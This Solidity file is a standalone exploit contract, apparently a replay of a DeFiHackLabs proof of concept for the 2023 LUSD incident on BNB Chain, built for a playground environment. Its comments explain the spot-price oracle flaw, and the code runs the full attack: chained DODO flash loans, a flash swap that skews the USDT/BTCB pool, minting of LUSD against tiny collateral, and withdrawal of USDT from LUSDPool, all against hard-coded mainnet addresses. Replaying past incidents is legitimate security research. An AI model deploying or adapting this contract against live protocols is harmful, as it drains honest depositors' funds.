// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-LUSD).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `LUSDTEST` harness
// (attacker = address(this); the chained DODO flash-loan callback
// `DPPFlashLoanCall` and the PancakeSwap flash-swap callback `pancakeCall` both
// live on the test itself). There is no standalone attack contract to deploy,
// so this is a faithful, self-contained copy of the test's inline attack
// (testSkim() body -> run(), same callbacks, minimal inline interfaces -- no
// imports so it compiles anywhere), compiled inside the registry forge
// project. Logic and constants are copied verbatim from test/LUSD_exp.sol.
//
// Root cause: Loan.supply() prices the supplied collateral via
// router.getAmountsOut() -- a pure spot read of the PancakeSwap USDT/BTCB
// pair's INSTANTANEOUS reserves, with no TWAP/oracle/sanity bound. The
// attacker chains 5 DODO DPPOracle flash-loans (each callback triggers the
// next) purely to source the ~$2M USDT float; inside the deepest callback it
// flash-swaps the USDT/BTCB pair to drain ~95% of its BTCB, inflating BTCB's
// spot price ~447x, then calls Loan.supply() with a tiny real amount of BTCB
// that getAmountsOut now misprices at ~20,000 USDT, minting ~10,000 LUSD
// against ~$46 of real collateral. LUSDPool.withdraw() redeems that
// fraudulent LUSD 1:1 for USDT from the pool's honest deposits. The attacker
// then unwinds the pool skew and repays every flash loan.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ILoan {
    function supply(address supplyToken, uint256 supplyAmount) external;
}

interface ILUSDPool {
    function withdraw(uint256 amount) external;
}

interface IDPPOracleMin {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakePairMin {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouterMin {
    // unused directly (approvals only reference it), kept for parity with the test
}

contract LUSDDrain {
    IERC20Min constant BEP20USDT = IERC20Min(0x55d398326f99059fF775485246999027B3197955);
    IERC20Min constant BTCB = IERC20Min(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20Min constant LUSD = IERC20Min(0x3cD632C25A4Db4c1A636cFb23B9285Be1097A60d);

    ILoan constant LOAN_ADDRESS = ILoan(0xdeC12a1dCbC1F741cCD02dFd862ab226F6383003);
    ILUSDPool constant POOL_ADDRESS = ILUSDPool(0x637De69F45F3b66D5389F305088A38109aA0cf7C);

    IDPPOracleMin constant DPPOracle1 = IDPPOracleMin(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracleMin constant DPPOracle2 = IDPPOracleMin(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracleMin constant DPPOracle3 = IDPPOracleMin(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracleMin constant DPP = IDPPOracleMin(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracleMin constant DPPAdvanced = IDPPOracleMin(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IPancakePairMin constant CakeLP = IPancakePairMin(0x3F803EC2b816Ea7F06EC76aA2B6f2532F9892d62);

    // Entry point (mirrors testSkim()). No constructor-time state needed.
    function run() external {
        takeFlashloan(DPPOracle1);
    }

    // Chained DODO flash-loan callback (DPPFlashLoanCall). Each hop borrows the
    // FULL USDT balance of the current oracle and re-lends via the next oracle,
    // purely to source working capital for the pool-skew flash-swap below. The
    // deepest callback (after DPPAdvanced) performs the actual attack.
    function DPPFlashLoanCall(
        address, /* sender */
        uint256, /* baseAmount */
        uint256 quoteAmount,
        bytes calldata /* data */
    ) external {
        if (msg.sender == address(DPPOracle1)) {
            takeFlashloan(DPPOracle2);
        } else if (msg.sender == address(DPPOracle2)) {
            takeFlashloan(DPPOracle3);
        } else if (msg.sender == address(DPPOracle3)) {
            takeFlashloan(DPP);
        } else if (msg.sender == address(DPP)) {
            takeFlashloan(DPPAdvanced);
        } else {
            // Deepest callback: skew the USDT/BTCB pool, mint fraudulent LUSD,
            // cash it out, then unwind the skew.
            BEP20USDT.approve(ROUTER, type(uint256).max);

            // Flash-swap: pull ~1.247 BTCB out of the pair; repayment (800,000
            // USDT) happens in pancakeCall() below, triggered by this swap.
            CakeLP.swap(0, 1_246_953_598_313_175_025, address(this), "0x0");

            // Supply a tiny real amount of BTCB (~$46) to Loan. Against the
            // now-skewed pool, getAmountsOut misprices it at ~20,000.82 USDT,
            // minting ~10,000.41 LUSD at the 50% supplyRatio.
            BTCB.approve(address(LOAN_ADDRESS), type(uint256).max);
            LOAN_ADDRESS.supply(address(BTCB), 1_515_366_635_982_742);

            // Cash out the fraudulent LUSD 1:1 for USDT from LUSDPool.
            LUSD.approve(address(POOL_ADDRESS), type(uint256).max);
            POOL_ADDRESS.withdraw(LUSD.balanceOf(address(this)));

            // Unwind: send the manipulated BTCB back into the pair and pull out
            // the USDT, restoring reserves and freeing capital to repay loans.
            BTCB.transfer(address(CakeLP), BTCB.balanceOf(address(this)));
            CakeLP.swap(799_764_317_883_596_339_564_612, 0, address(this), "");
        }

        // Repay this hop's flash loan.
        BEP20USDT.transfer(msg.sender, quoteAmount);
    }

    // PancakeSwap flash-swap repayment callback for the CakeLP.swap(0, ..., "0x0")
    // call above. Repays the 800,000 USDT that funds the BTCB pull.
    function pancakeCall(
        address, /* sender */
        uint256, /* amount0 */
        uint256, /* amount1 */
        bytes calldata /* data */
    ) external {
        BEP20USDT.transfer(address(CakeLP), 800_000 ether);
    }

    function takeFlashloan(IDPPOracleMin oracle) internal {
        oracle.flashLoan(0, BEP20USDT.balanceOf(address(oracle)), address(this), new bytes(1));
    }
}
